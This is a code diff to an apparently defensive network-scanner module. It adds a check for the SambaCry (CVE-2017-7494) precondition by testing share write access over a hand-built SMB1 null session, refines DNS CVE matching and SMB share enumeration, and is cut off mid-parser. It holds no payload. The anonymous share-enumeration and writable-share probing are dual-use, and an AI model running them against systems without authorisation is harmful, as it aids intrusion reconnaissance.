@@ -5,9 +5,10 @@ import struct
 
 import requests
 
+from ...constants import AUTH_SKIPPED
 from ...findings import Finding, Severity, probe_result, probe_error
 from ... import cvss_vectors as V
-from ...cve_db import check_cves
+from ...cve_db import check_cves, probe_cve_fields
 from ..probe_registry import register_probe, CATEGORY_SERVICE_INFO
 from ._base import _ServiceProbeBase
 
@@ -193,8 +194,8 @@ class _ServiceInfraMixin(_ServiceProbeBase):
   @register_probe(
     display_name="SNMP service detection",
     description=(
-      "SNMP v1/v2c/v3 detection with default-community probes "
-      "(public/private). Walks system MIB to detect ICS/SCADA "
+      "SNMP v1/v2c/v3 detection with the default community probe "
+      "(public), sent only when active_auth is on. Walks system MIB to detect ICS/SCADA "
       "indicators and leaked interface IPs."
     ),
     category=CATEGORY_SERVICE_INFO,
@@ -218,6 +219,8 @@ class _ServiceInfraMixin(_ServiceProbeBase):
     dict
       Structured findings.
     """
+    if not self._login_attempts_allowed():
+      return probe_result(raw_data={"banner": None, "auth_control": dict(AUTH_SKIPPED)}, findings=[])
     findings = []
     raw = {"banner": None}
     sock = None
@@ -464,6 +467,27 @@ class _ServiceInfraMixin(_ServiceProbeBase):
       return None
     return {"system": system, "findings": walk_findings}
 
+  # version.bind answer -> cve_db product key. First match wins; the plain
+  # BIND shape (`9.18.24-S1`, `9.10.3-P4-Debian`, `BIND 9.16.1`) comes last.
+  _DNS_PRODUCT_PATTERNS = [
+    (_re.compile(r'dnsmasq[-/\s]*(\d+\.\d+(?:\.\d+)*)', _re.IGNORECASE), "dnsmasq"),
+    (_re.compile(r'(?:pdns|powerdns)[^\d]*(\d+\.\d+(?:\.\d+)*)', _re.IGNORECASE), "powerdns"),
+    (_re.compile(r'unbound[-/\s]*(\d+\.\d+(?:\.\d+)*)', _re.IGNORECASE), "unbound"),
+    (_re.compile(r'^\s*(?:BIND\s+)?(9\.\d+(?:\.\d+)*(?:-[SP]\d+)?)', _re.IGNORECASE), "bind"),
+  ]
+
+  def _dns_identify_product(self, txt):
+    """Map a version.bind answer to ``(product, version)``, or ``(None, None)``.
+
+    Only a BIND-shaped answer yields ``bind``; the BIND edition tag (`-S1`) and
+    patch level (`-P4`) are kept because they are different builds.
+    """
+    for pattern, product in self._DNS_PRODUCT_PATTERNS:
+      m = pattern.search(txt)
+      if m:
+        return product, m.group(1)
+    return None, None
+
   @register_probe(
     display_name="DNS service detection",
     description=(
@@ -541,10 +565,12 @@ class _ServiceInfraMixin(_ServiceProbeBase):
                     confidence="certain",
                   ))
                   parsed = True
-                  # CVE check — version.bind is BIND-specific
-                  _bind_m = _re.search(r'(\d+\.\d+(?:\.\d+)*)', txt)
-                  if _bind_m:
-                    findings += check_cves("bind", _bind_m.group(1))
+                  # CVE check — only for the product the answer names. Any
+                  # server answers version.bind; dnsmasq, PowerDNS and Unbound
+                  # must not be matched against BIND CVEs.
+                  _dns_product, _dns_version = self._dns_identify_product(txt)
+                  if _dns_product and _dns_version:
+                    findings += check_cves(_dns_product, _dns_version)
 
       # Fallback: check raw data for version keywords
       if not parsed:
@@ -983,14 +1009,14 @@ class _ServiceInfraMixin(_ServiceProbeBase):
 
       if admin_shares:
         findings.append(Finding(
-          severity=Severity.HIGH,
-          cvss_vector=V.SENSITIVE_DATA_EXPOSED,
-          title=f"SMB admin shares accessible via null session: {', '.join(admin_shares)}",
-          description="Administrative shares are accessible without authentication.",
+          severity=Severity.MEDIUM,
+          cvss_vector=V.INFO_DISCLOSURE_MEDIUM,
+          title=f"SMB admin shares listed via null session: {', '.join(admin_shares)}",
+          description="An anonymous session lists administrative shares; access to them was not tested.",
           evidence=f"Shares: {share_names}",
           remediation="Disable null session access; restrict admin shares.",
           owasp_id="A01:2021",
-          cwe_id="CWE-284",
+          cwe_id="CWE-200",
           confidence="certain",
         ))
       else:
@@ -1004,6 +1030,33 @@ class _ServiceInfraMixin(_ServiceProbeBase):
           owasp_id="A01:2021",
           cwe_id="CWE-200",
           confidence="certain",
+        ))
+
+    # CVE-2017-7494: a share the anonymous session may write to is the precondition SambaCry needs.
+    if shares and any("CVE-2017-7494" in (f.cve or ()) for f in findings):
+      access, access_error = self._smb_share_access(target, port, shares)
+      raw["share_access"] = {name: (f"0x{v:08x}" if isinstance(v, int) else v) for name, v in access.items()}
+      if access_error:
+        raw["share_access_error"] = access_error
+        self.P(f"SMB share access check failed on {target}:{port}: {access_error}", color='y')
+      writable = sorted(n for n, v in access.items() if isinstance(v, int) and v & self._SMB_WRITE_RIGHTS)
+      if writable:
+        findings.append(Finding(
+          severity=Severity.CRITICAL,
+          cvss_vector=V.UNAUTHENTICATED_READ_WRITE,
+          title="CVE-2017-7494: Samba writable share (SambaCry precondition)",
+          cve=("CVE-2017-7494",),
+          **probe_cve_fields("CVE-2017-7494"),
+          description=f"Samba {samba_version} is in the affected range and the anonymous session holds share-level "
+                      "write access (Tree Connect MaximalAccess), the precondition for loading a shared library "
+                      "through a share. No file was written to a disk share and no module was loaded.",
+          evidence=f"Tree Connect MaximalAccess (share-level), write bits on: {writable}; Samba {samba_version}",
+          remediation="Upgrade Samba to 4.6.4 or later; set 'nt pipe support = no'; "
+                      "remove anonymous write access and mount shares noexec.",
+          owasp_id="A06:2021",
+          cwe_id="CWE-94",
+          confidence="firm",
+          confidence_reason="behaviour_confirmed",
         ))
 
     if not findings:
@@ -1023,6 +1076,11 @@ class _ServiceInfraMixin(_ServiceProbeBase):
         confidence="certain",
       ))
 
+    if not shares and protocol_id == b"\xfeSMB":
+      # The enumeration is SMBv1 only (RM-271 D72, no SMB2 client): say what was observed, not why.
+      raw["shares_error"] = "SMB2 negotiated; no shares via SMB1"
+      self.P(f"SMB share enumeration on {target}:{port}: {raw['shares_error']}", color='y')
+
     return probe_result(raw_data=raw, findings=findings)
 
   @staticmethod
@@ -1036,12 +1094,122 @@ class _ServiceInfraMixin(_ServiceProbeBase):
       buf += chunk
     return buf
 
+  @staticmethod
+  def _smb_header(cmd, tid=0, uid=0):
+    """32-byte SMB1 request header (MS-CIFS 2.2.3.1): Flags at byte 9, Flags2 at bytes 10-11, TID 24, UID 28.
+
+    Flags2 0xC001 = Unicode, NT status codes, long names, no extended security: the null Session Setup
+    below is the plain 13-word form.
+    """
+    hdr = bytearray(32)
+    hdr[0:4] = b"\xffSMB"
+    hdr[4] = cmd
+    hdr[9] = 0x18
+    struct.pack_into("<H", hdr, 10, 0xC001)
+    struct.pack_into("<H", hdr, 24, tid)
+    struct.pack_into("<H", hdr, 28, uid)
+    return bytes(hdr)
+
+  @staticmethod
+  def _smb_null_session_request():
+    """Session Setup AndX body for a null session, non-extended form (MS-CIFS 2.2.4.53.1): wc 13, 26 word bytes."""
+    words = struct.pack("<BBBHHHHIHHII",
+      13,        # word count
+      0xFF,      # AndXCommand: no further
+      0,         # AndXReserved
+      0,         # AndXOffset
+      65535,     # MaxBufferSize
+      1,         # MaxMpxCount
+      0,         # VcNumber
+      0,         # SessionKey
+      0,         # OEMPasswordLen
+      0,         # UnicodePasswordLen
+      0,         # Reserved
+      0x000000D4,  # Capabilities, without CAP_EXTENDED_SECURITY
+    )
+    return words + struct.pack("<H", 1) + b"\x00"
+
+  # FILE_WRITE_DATA | FILE_APPEND_DATA | GENERIC_ALL | GENERIC_WRITE (MS-SMB 2.2.4.7.2 access mask)
+  _SMB_WRITE_RIGHTS = 0x00000002 | 0x00000004 | 0x10000000 | 0x40000000
+
+  @staticmethod
+  def _smb_tree_max_access(resp):
+    """``(mask, None)`` from an extended Tree Connect AndX response, else ``(None, reason)``.
+
+    The frame must be an SMB1 Tree Connect AndX (`\\xffSMB`, command 0x75): a stray or leftover frame is not
+    parsed as a mask.
+    """
+    if len(resp) < 32 or resp[0:4] != b"\xffSMB" or resp[4] != 0x75:
+      return None, "unexpected response frame"
+    status = struct.unpack_from("<I", resp, 5)[0]
+    if status != 0:
+      return None, f"status 0x{status:08x}"
+    if len(resp) < 47 or resp[32] != 7:
+      return None, "short response"
+    return struct.unpack_from("<I", resp, 39)[0], None
+
+  def _smb_share_access(self, target, port, shares):
+    """Maximal access rights the null session holds on each disk share, from Tree Connect AndX only.
+
+    Read-only: negotiate, null Session Setup, one Tree Connect per share (extended response flag), no
+    open, write or upload. Returns ``({share: mask or {"error": reason}}, error)``; ``error`` is None or the exception text,
+    so a helper failure is not read as "no writable share".
+    """
+    access = {}
+    sock = None
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(self._target_timeout(4))
+      sock.connect((target, port))
+
+      def _exchange(cmd, words_and_bytes, tid=0, uid=0):
+        payload = self._smb_header(cmd, tid, uid) + words_and_bytes
+        sock.sendall(b"\x00" + struct.pack(">I", len(payload))[1:] + payload)
+        resp_hdr = self._smb_recv_exact(sock, 4)
+        if not resp_hdr:
+          return None
+        size = struct.unpack(">I", b"\x00" + resp_hdr[1:4])[0]
+        if size > 65536:
+          raise ValueError(f"SMB frame of {size} bytes exceeds the 65536 cap")  # unread bytes would desync
+        return self._smb_recv_exact(sock, size)
+
+      dialects = b"\x02NT LM 0.12\x00"
+      neg = _exchange(0x72, struct.pack("<BH", 0, len(dialects)) + dialects)
+      if not neg or len(neg) < 32:
+        return access, "negotiate failed"
+      sess = _exchange(0x73, self._smb_null_session_request())
+      if not sess or len(sess) < 32 or struct.unpack_from("<I", sess, 5)[0] not in (0, 0xC0000016):
+        return access, "null session refused"
+      uid = struct.unpack_from("<H", sess, 28)[0]
+      # only disk shares; IPC$, printers and admin shares are not a SambaCry upload path
+      disk_shares = [s for s in shares if (s.get("type", 0) & 0xFF) == 0 and not s["name"].endswith("$")]
+      for share in disk_shares[:16]:
+        name = share["name"]
+        path = f"\\\\{target}\\{name}".encode("utf-16-le") + b"\x00\x00"
+        body = b"\x00" + path + b"?????\x00"
+        # wct 4: AndXCommand, reserved, AndXOffset, Flags (0x0008 = extended response), PasswordLength
+        words = struct.pack("<BBBHHH", 4, 0xFF, 0, 0, 0x0008, 1)
+        resp = _exchange(0x75, words + struct.pack("<H", len(body)) + body, uid=uid)
+        mask, reason = self._smb_tree_max_access(resp) if resp else (None, "no response")
+        access[name] = mask if mask is not None else {"error": reason}
+    except Exception as exc:
+      return access, str(exc)
+    finally:
+      if sock is not None:
+        try:
+          sock.close()
+        except Exception:
+          pass
+    return access, None
+
   def _smb_enum_shares(self, target, port):
     """Enumerate SMB shares via null session + IPC$ + srvsvc NetShareEnumAll.
 
     Performs the full SMBv1 protocol sequence:
       Negotiate -> Session Setup (null) -> Tree Connect IPC$ ->
       Open \\srvsvc pipe -> DCE/RPC Bind -> NetShareEnumAll -> parse results.
+    Every reply is checked (SMB command, status, DCE/RPC packet type and length); the first bad
+    one ends the run.
 
     Parameters
     ----------
@@ -1062,109 +1230,82 @@ class _ServiceInfraMixin(_ServiceProbeBase):
       sock.settimeout(self._target_timeout(4))
       sock.connect((target, port))
 
-      def _send_smb(payload):
-        nb_hdr = b"\x00" + struct.pack(">I", len(payload))[1:]
-        sock.sendall(nb_hdr + payload)
-
-      def _recv_smb():
+      def _exchange(cmd, body, tid=0, uid=0, ok_status=(0,)):
+        """Send one SMB1 request; return the reply only if it answers `cmd` with an accepted status."""
+        payload = self._smb_header(cmd, tid, uid) + body
+        sock.sendall(b"\x00" + struct.pack(">I", len(payload))[1:] + payload)
         resp_hdr = self._smb_recv_exact(sock, 4)
         if not resp_hdr:
           return None
-        resp_len = struct.unpack(">I", b"\x00" + resp_hdr[1:4])[0]
-        return self._smb_recv_exact(sock, min(resp_len, 65536))
+        size = struct.unpack(">I", b"\x00" + resp_hdr[1:4])[0]
+        if size > 65536:
+          return None
+        resp = self._smb_recv_exact(sock, size)
+        if not resp or len(resp) < 33 or resp[0:4] != b"\xffSMB" or resp[4] != cmd:
+          return None
+        if struct.unpack_from("<I", resp, 5)[0] not in ok_status:
+          return None
+        return resp
+
+      def _pipe_call(fid, pdu, tid, uid):
+        """Write one DCE/RPC PDU to the pipe, read one back; return the PDU bytes or None."""
+        # Write AndX, wc 14: AndX(4) FID Offset Timeout WriteMode Remaining DataLenHigh DataLen DataOffset OffsetHigh
+        wr = struct.pack("<BBBHH", 14, 0xFF, 0, 0, fid) + struct.pack("<II", 0, 0)
+        wr += struct.pack("<HHHHH", 0x0008, 0, 0, len(pdu), 32 + 1 + 28 + 2) + struct.pack("<I", 0)
+        if not _exchange(0x2F, wr + struct.pack("<H", len(pdu)) + pdu, tid, uid):
+          return None
+        # Read AndX, wc 12: AndX(4) FID Offset MaxCount MinCount Timeout Remaining OffsetHigh. A pipe read
+        # has no minimum: a MinCount above the bytes waiting blocks.
+        rd = struct.pack("<BBBHH", 12, 0xFF, 0, 0, fid) + struct.pack("<IHHIH", 0, 4280, 0, 0, 0)
+        rd += struct.pack("<I", 0) + struct.pack("<H", 0)
+        resp = _exchange(0x2E, rd, tid, uid)  # status 0x80000005 (more data) is refused: incomplete
+        # wc 12; DataLength is word 5 and DataOffset word 6 (MS-CIFS 2.2.4.42.2)
+        if not resp or len(resp) < 59 or resp[32] != 12:
+          return None
+        data_len, data_off = struct.unpack_from("<HH", resp, 33 + 5 * 2)
+        if data_off < 59 or data_off + data_len > len(resp):
+          return None
+        return resp[data_off:data_off + data_len]
+
+      def _dce_body(pdu, ptype, header_size):
+        """The bytes after `header_size` of a single-fragment PDU of `ptype`, else None (nak/fault/short)."""
+        if not pdu or len(pdu) < header_size or pdu[0] != 5 or pdu[2] != ptype or pdu[3] & 3 != 3:
+          return None
+        frag_len = struct.unpack_from("<H", pdu, 8)[0]
+        if frag_len < header_size or frag_len > len(pdu):
+          return None
+        return pdu[header_size:frag_len]
 
       # ---- 1. Negotiate (NT LM 0.12) ----
       dialects = b"\x02NT LM 0.12\x00"
-      smb_hdr = bytearray(32)
-      smb_hdr[0:4] = b"\xffSMB"
-      smb_hdr[4] = 0x72  # Negotiate
-      smb_hdr[13] = 0x18
-      struct.pack_into("<H", smb_hdr, 14, 0xC803)
-      smb_body = struct.pack("<BH", 0, len(dialects)) + dialects
-      _send_smb(bytes(smb_hdr) + smb_body)
-
-      neg_resp = _recv_smb()
-      if not neg_resp or len(neg_resp) < 32:
+      if not _exchange(0x72, struct.pack("<BH", 0, len(dialects)) + dialects):
         return []
 
       # ---- 2. Session Setup AndX (null creds) ----
-      smb_hdr2 = bytearray(32)
-      smb_hdr2[0:4] = b"\xffSMB"
-      smb_hdr2[4] = 0x73  # Session Setup AndX
-      smb_hdr2[13] = 0x18
-      struct.pack_into("<H", smb_hdr2, 14, 0xC803)
-
-      words = struct.pack("<BBHHIHIHII",
-        13,        # word count
-        0xFF,      # AndXCommand: no further
-        0,         # reserved
-        0,         # AndXOffset
-        65535,     # max buffer size
-        1,         # max mpx count
-        0,         # VC number
-        0,         # session key
-        0,         # ANSI password length
-        0,         # Unicode password length
-      )
-      words += struct.pack("<I", 0x000000D4)  # capabilities
-      byte_data = b"\x00"
-      byte_count = struct.pack("<H", len(byte_data))
-      _send_smb(bytes(smb_hdr2) + words + byte_count + byte_data)
-
-      sess_resp = _recv_smb()
-      if not sess_resp or len(sess_resp) < 32:
-        return []
-
-      # Check NT Status (bytes 5-8): 0 = success
-      nt_status = struct.unpack_from("<I", sess_resp, 5)[0]
       # Accept STATUS_SUCCESS (0) or STATUS_MORE_PROCESSING_REQUIRED (0xC0000016)
-      if nt_status not in (0x00000000, 0xC0000016):
+      sess_resp = _exchange(0x73, self._smb_null_session_request(), ok_status=(0, 0xC0000016))
+      if not sess_resp:
         return []
-
       uid = struct.unpack_from("<H", sess_resp, 28)[0]
 
       # ---- 3. Tree Connect AndX to \\target\IPC$ ----
-      smb_hdr3 = bytearray(32)
-      smb_hdr3[0:4] = b"\xffSMB"
-      smb_hdr3[4] = 0x75  # Tree Connect AndX
-      smb_hdr3[13] = 0x18
-      struct.pack_into("<H", smb_hdr3, 14, 0xC803)
-      struct.pack_into("<H", smb_hdr3, 28, uid)  # UID
-
-      # Tree Connect AndX words: word_count=4
       path_str = f"\\\\{target}\\IPC$".encode("utf-16-le") + b"\x00\x00"
-      service_str = b"?????\x00"
       tc_password = b"\x00"
-      tc_byte_data = tc_password + path_str + service_str
-      tc_words = struct.pack("<BBHHH",
+      tc_byte_data = tc_password + path_str + b"?????\x00"
+      tc_words = struct.pack("<BBBHHH",
         4,         # word count
         0xFF,      # AndXCommand: no further
         0,         # reserved
         0,         # AndXOffset
+        0,         # flags
         len(tc_password),  # password length
       )
-      tc_byte_count = struct.pack("<H", len(tc_byte_data))
-      _send_smb(bytes(smb_hdr3) + tc_words + tc_byte_count + tc_byte_data)
-
-      tc_resp = _recv_smb()
-      if not tc_resp or len(tc_resp) < 32:
+      tc_resp = _exchange(0x75, tc_words + struct.pack("<H", len(tc_byte_data)) + tc_byte_data, uid=uid)
+      if not tc_resp:
         return []
-
-      nt_status = struct.unpack_from("<I", tc_resp, 5)[0]
-      if nt_status != 0:
-        return []
-
       tid = struct.unpack_from("<H", tc_resp, 24)[0]
 
       # ---- 4. NT Create AndX -- open \srvsvc named pipe ----
-      smb_hdr4 = bytearray(32)
-      smb_hdr4[0:4] = b"\xffSMB"
-      smb_hdr4[4] = 0xA2  # NT Create AndX
-      smb_hdr4[13] = 0x18
-      struct.pack_into("<H", smb_hdr4, 14, 0xC803)
-      struct.pack_into("<H", smb_hdr4, 24, tid)
-      struct.pack_into("<H", smb_hdr4, 28, uid)
-
       pipe_name = "\\srvsvc".encode("utf-16-le") + b"\x00\x00"
       # NT Create AndX words: word_count=24
       nc_words = struct.pack("<BB", 24, 0xFF)  # word count, AndXCommand
@@ -1183,24 +1324,13 @@ class _ServiceInfraMixin(_ServiceProbeBase):
       nc_words += struct.pack("<I", 0x00000002)  # impersonation level
       nc_words += struct.pack("<B", 0)           # security flags
 
-      nc_byte_count = struct.pack("<H", len(pipe_name))
-      _send_smb(bytes(smb_hdr4) + nc_words + nc_byte_count + pipe_name)
-
-      nc_resp = _recv_smb()
-      if not nc_resp or len(nc_resp) < 42:
+      # header 32 + wc 1 + 48 + byte count 2 is odd: a 1-byte pad aligns the Unicode name (MS-CIFS 2.2.4.64.1)
+      nc_bytes = b"\x00" + pipe_name
+      nc_resp = _exchange(0xA2, nc_words + struct.pack("<H", len(nc_bytes)) + nc_bytes, tid, uid)
+      # FID: header(32) + wc(1) + AndXCommand(1) + reserved(1) + AndXOffset(2) + OpLockLevel(1) = offset 38
+      if not nc_resp or len(nc_resp) < 40 or nc_resp[32] < 1:
         return []
-
-      nt_status = struct.unpack_from("<I", nc_resp, 5)[0]
-      if nt_status != 0:
-        return []
-
-      # FID is in NT Create AndX response words.
-      # SMB header (32) + word_count(1) + AndXCommand(1) + reserved(1) +
-      #   AndXOffset(2) + OpLockLevel(1) + FID(2)
-      wc = nc_resp[32]
-      if wc < 1:
-        return []
-      fid = struct.unpack_from("<H", nc_resp, 32 + 1 + 1 + 1 + 2 + 1)[0]  # offset 38
+      fid = struct.unpack_from("<H", nc_resp, 38)[0]
 
       # ---- 5. DCE/RPC Bind to srvsvc ----
       # srvsvc UUID: 4b324fc8-1670-01d3-1278-5a47bf6ee188 v3.0
@@ -1223,72 +1353,23 @@ class _ServiceInfraMixin(_ServiceProbeBase):
       bind_body += struct.pack("<I", 1)  # num_ctx_items (with padding byte included)
       bind_body += ctx_item
 
-      # DCE/RPC header: version=5, minor=0, type=11(bind), flags=3
+      # DCE/RPC header (16 bytes): version=5, minor=0, type=11(bind), flags=3
       dce_hdr = struct.pack("<BBBBIHHI",
         5, 0,        # version major, minor
         11,          # packet type: bind
         3,           # flags: first_frag | last_frag
         0x00000010,  # data representation (little-endian, ASCII, IEEE)
-        24 + len(bind_body),  # frag length
+        16 + len(bind_body),  # frag length
         0,           # auth length
         1,           # call id
       )
-      bind_pkt = dce_hdr + bind_body
-
-      # Write via SMB Write AndX
-      smb_hdr5 = bytearray(32)
-      smb_hdr5[0:4] = b"\xffSMB"
-      smb_hdr5[4] = 0x2F  # Write AndX
-      smb_hdr5[13] = 0x18
-      struct.pack_into("<H", smb_hdr5, 14, 0xC803)
-      struct.pack_into("<H", smb_hdr5, 24, tid)
-      struct.pack_into("<H", smb_hdr5, 28, uid)
-
-      # Write AndX words: word_count=14
-      data_offset = 32 + 1 + (14 * 2) + 2  # smb_header + wc_byte + words + byte_count
-      wr_words = struct.pack("<BB", 14, 0xFF)   # word count, AndXCommand
-      wr_words += struct.pack("<BH", 0, 0)       # reserved, AndXOffset
-      wr_words += struct.pack("<H", fid)          # FID
-      wr_words += struct.pack("<I", 0)            # offset
-      wr_words += struct.pack("<I", 0)            # reserved
-      wr_words += struct.pack("<HH", 0x0008, 0)  # write mode (message start), remaining
-      wr_words += struct.pack("<HH", 0, len(bind_pkt))  # data length high, data length
-      wr_words += struct.pack("<H", data_offset)  # data offset
-      wr_words += struct.pack("<I", 0)            # high offset
-
-      wr_byte_count = struct.pack("<H", len(bind_pkt))
-      _send_smb(bytes(smb_hdr5) + wr_words + wr_byte_count + bind_pkt)
-
-      wr_resp = _recv_smb()
-      if not wr_resp or len(wr_resp) < 32:
+      ack = _dce_body(_pipe_call(fid, dce_hdr + bind_body, tid, uid), 12, 16)  # 12 = bind_ack, 13 = bind_nak
+      if ack is None or len(ack) < 12:
         return []
-
-      # ---- Read Bind Ack ----
-      smb_hdr6 = bytearray(32)
-      smb_hdr6[0:4] = b"\xffSMB"
-      smb_hdr6[4] = 0x2E  # Read AndX
-      smb_hdr6[13] = 0x18
-      struct.pack_into("<H", smb_hdr6, 14, 0xC803)
-      struct.pack_into("<H", smb_hdr6, 24, tid)
-      struct.pack_into("<H", smb_hdr6, 28, uid)
-
-      # Read AndX words: word_count=12
-      rd_words = struct.pack("<BB", 12, 0xFF)   # word count, AndXCommand
-      rd_words += struct.pack("<BH", 0, 0)       # reserved, AndXOffset
-      rd_words += struct.pack("<H", fid)          # FID
-      rd_words += struct.pack("<I", 0)            # offset
-      rd_words += struct.pack("<H", 4096)         # max count
-      rd_words += struct.pack("<H", 4096)         # min count
-      rd_words += struct.pack("<I", 0)            # max count high (timeout)
-      rd_words += struct.pack("<H", 0)            # remaining
-      rd_words += struct.pack("<I", 0)            # high offset
-
-      rd_byte_count = struct.pack("<H", 0)
-      _send_smb(bytes(smb_hdr6) + rd_words + rd_byte_count)
-
-      bind_ack = _recv_smb()
-      if not bind_ack or len(bind_ack) < 32:
-        return []
+      # bind_ack: max_xmit, max_recv, assoc group, secondary address (counted, padded to 4), then the results
+      res_off = (8 + 2 + struct.unpack_from("<H", ack, 8)[0] + 3) & ~3
+      if len(ack) < res_off + 6 or ack[res_off] < 1 or struct.unpack_from("<H", ack, res_off + 4)[0] != 0:
+        return []  # no accepted presentation context
 
       # ---- 6. NetShareEnumAll request (opnum 15) ----
       # Stub data: server name as referent pointer + info level + enum handle
@@ -1311,7 +1392,7 @@ class _ServiceInfraMixin(_ServiceProbeBase):
       stub += struct.pack("<I", 0)                 # entries read = 0
       stub += struct.pack("<I", 0)                 # null buffer pointer
       stub += struct.pack("<I", 0xFFFFFFFF)        # preferred max length
-      stub += struct.pack("<I", 0)                 # resume handle pointer (referent)
+      stub += struct.pack("<I", 0x00020008)        # resume handle pointer (non-null referent)
       stub += struct.pack("<I", 0)                 # resume handle value
 
       dce_req_hdr = struct.pack("<BBBBIHHI",
@@ -1319,91 +1400,17 @@ class _ServiceInfraMixin(_ServiceProbeBase):
         0,           # packet type: request
         3,           # flags: first_frag | last_frag
         0x00000010,  # data representation
-        24 + 8 + len(stub),  # frag length (hdr + req fields + stub)
+        16 + 8 + len(stub),  # frag length (16 header + 8 request fields + stub)
         0,           # auth length
         2,           # call id
       )
       # Request PDU fields: alloc_hint, context_id, opnum
       dce_req_body = struct.pack("<IHH", len(stub), 0, 15)  # opnum 15 = NetShareEnumAll
-      req_pkt = dce_req_hdr + dce_req_body + stub
-
-      # Write the request
-      smb_hdr7 = bytearray(32)
-      smb_hdr7[0:4] = b"\xffSMB"
-      smb_hdr7[4] = 0x2F  # Write AndX
-      smb_hdr7[13] = 0x18
-      struct.pack_into("<H", smb_hdr7, 14, 0xC803)
-      struct.pack_into("<H", smb_hdr7, 24, tid)
-      struct.pack_into("<H", smb_hdr7, 28, uid)
-
-      data_offset2 = 32 + 1 + (14 * 2) + 2
-      wr_words2 = struct.pack("<BB", 14, 0xFF)
-      wr_words2 += struct.pack("<BH", 0, 0)
-      wr_words2 += struct.pack("<H", fid)
-      wr_words2 += struct.pack("<I", 0)
-      wr_words2 += struct.pack("<I", 0)
-      wr_words2 += struct.pack("<HH", 0x0008, 0)
-      wr_words2 += struct.pack("<HH", 0, len(req_pkt))
-      wr_words2 += struct.pack("<H", data_offset2)
-      wr_words2 += struct.pack("<I", 0)
-
-      wr2_byte_count = struct.pack("<H", len(req_pkt))
-      _send_smb(bytes(smb_hdr7) + wr_words2 + wr2_byte_count + req_pkt)
-
-      wr2_resp = _recv_smb()
-      if not wr2_resp or len(wr2_resp) < 32:
+      # response PDU: 16 header + alloc_hint(4) + context_id(2) + cancel_count(1) + reserved(1), then the stub
+      resp_stub = _dce_body(_pipe_call(fid, dce_req_hdr + dce_req_body + stub, tid, uid), 2, 24)
+      if resp_stub is None:
         return []
-
-      # ---- Read NetShareEnumAll response ----
-      smb_hdr8 = bytearray(32)
-      smb_hdr8[0:4] = b"\xffSMB"
-      smb_hdr8[4] = 0x2E  # Read AndX
-      smb_hdr8[13] = 0x18
-      struct.pack_into("<H", smb_hdr8, 14, 0xC803)
-      struct.pack_into("<H", smb_hdr8, 24, tid)
-      struct.pack_into("<H", smb_hdr8, 28, uid)
-
-      rd_words2 = struct.pack("<BB", 12, 0xFF)
-      rd_words2 += struct.pack("<BH", 0, 0)
-      rd_words2 += struct.pack("<H", fid)
-      rd_words2 += struct.pack("<I", 0)
-      rd_words2 += struct.pack("<H", 8192)
-      rd_words2 += struct.pack("<H", 0)
-      rd_words2 += struct.pack("<I", 0)
-      rd_words2 += struct.pack("<H", 0)
-      rd_words2 += struct.pack("<I", 0)
-
-      rd2_byte_count = struct.pack("<H", 0)
-      _send_smb(bytes(smb_hdr8) + rd_words2 + rd2_byte_count)
-
-      enum_resp = _recv_smb()
-      if not enum_resp or len(enum_resp) < 60:
-        return []
-
-      # ---- 7. Parse the response ----
-      # Find DCE/RPC response data inside the SMB Read AndX response.
-      # SMB Read AndX response: header(32) + word_count(1) + words(wc*2) +
-      #   byte_count(2) + pad + data.
-      wc8 = enum_resp[32]
-      if wc8 < 12:
-        return []
-      # Data offset from start of SMB header is at word 6 (0-indexed)
-      data_off = struct.unpack_from("<H", enum_resp, 32 + 1 + 11 * 2)[0]
-      data_len = struct.unpack_from("<H", enum_resp, 32 + 1 + 5 * 2)[0]
-
-      if data_off + data_len > len(enum_resp):
-        data_len = len(enum_resp) - data_off
-      if data_off >= len(enum_resp) or data_len < 24:
-        return []
-
-      dce_data = enum_resp[data_off:data_off + data_len]
-
-      # DCE/RPC response header is 24 bytes, then stub data
-      if len(dce_data) < 24:
-        return []
-      dce_stub = dce_data[24:]
-
-      return self._parse_netshareenumall_response(dce_stub)
+      return self._parse_netshareenumall_response(resp_stub)
 
     except Exception:
       return []
@@ -1415,8 +1422,17 @@ class _ServiceInfraMixin(_ServiceProbeBase):
           pass
 
   @staticmethod
+  def _smb_clean_text(text):
+    """Target-supplied share text: C0/C1 and bidi control characters dropped, at most 256 characters."""
+    bad = set(range(0x20)) | set(range(0x7F, 0xA0)) | {0x200E, 0x200F} | set(range(0x202A, 0x202F)) | set(range(0x2066, 0x206A))
+    return "".join(c for c in text if ord(c) not in bad)[:256]
+
+  @staticmethod
   def _parse_netshareenumall_response(stub):
-    """Parse NetShareEnumAll DCE/RPC stub response into share list.
+    """Parse a NetShareEnumAll (level 1) DCE/RPC stub response into a share list.
+
+    Any inconsistency (null name pointer, count mismatch, string not within the buffer or without its
+    terminator, a missing or non-zero trailing WERROR) rejects the whole reply: ``[]``.
 
     Parameters
     ----------
@@ -1428,81 +1444,55 @@ class _ServiceInfraMixin(_ServiceProbeBase):
     list[dict]
       Each dict: {"name": str, "type": int, "comment": str}.
     """
-    shares = []
     try:
-      if len(stub) < 20:
+      # info_level, switch_value, container referent, entries_read, array referent, array max_count
+      level, switch, container_ref, entries, array_ref, max_count = struct.unpack_from("<6I", stub, 0)
+      if level != 1 or switch != 1 or not container_ref or not array_ref:
         return []
-
-      # Response stub layout:
-      # [4] info_level
-      # [4] switch_value
-      # [4] referent pointer for SHARE_INFO_1_CONTAINER
-      # [4] entries_read
-      # [4] referent pointer for array
-      # Then for each entry: [4] name_ptr, [4] type, [4] comment_ptr
-      # Then the actual strings (NDR conformant arrays)
-
-      offset = 0
-      offset += 4  # info_level
-      offset += 4  # switch_value
-      offset += 4  # referent pointer
-      if offset + 4 > len(stub):
+      if not 0 < entries <= 500 or max_count < entries:
         return []
-      entries_read = struct.unpack_from("<I", stub, offset)[0]
-      offset += 4
-
-      if entries_read == 0 or entries_read > 500:
-        return []
-
-      offset += 4  # array referent pointer
-      offset += 4  # max count (NDR array header)
-
-      # Read the fixed-size entries: name_ptr(4) + type(4) + comment_ptr(4) each
-      entry_records = []
-      for _ in range(entries_read):
-        if offset + 12 > len(stub):
-          break
-        name_ptr = struct.unpack_from("<I", stub, offset)[0]
-        share_type = struct.unpack_from("<I", stub, offset + 4)[0]
-        comment_ptr = struct.unpack_from("<I", stub, offset + 8)[0]
-        entry_records.append((name_ptr, share_type, comment_ptr))
+      offset = 24
+      records = []
+      for _ in range(entries):
+        name_ptr, share_type, comment_ptr = struct.unpack_from("<3I", stub, offset)
+        if not name_ptr:
+          return []
+        records.append((share_type, bool(comment_ptr)))
         offset += 12
 
-      # Now read the NDR conformant strings (name then comment for each entry)
